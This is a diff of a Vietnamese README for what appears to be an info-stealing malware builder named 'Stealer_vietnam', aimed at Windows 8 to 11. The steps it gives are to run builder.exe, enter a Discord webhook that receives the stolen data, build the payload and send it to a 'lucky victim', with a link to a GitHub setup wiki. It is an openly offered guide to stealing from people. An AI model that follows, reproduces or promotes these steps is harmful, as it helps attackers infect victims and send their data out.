@@ -13,7 +13,8 @@ nó có thể hack 1 người rất đơn giản
 chỉ hack cho máy tính (Windows 8 x64 to Windows 11 x64)
 
 **sao để sài**
-[1. chạy builder.exe
+
+[chạy builder.exe
 ,nhập webhook discord
 ,nhấn build và gửi cho nạn nhân may mắn
 ,click vô đây để xem đầy đủ](https://github.com/s1uiasdad/Stealer_vietnam/wiki/Setup)
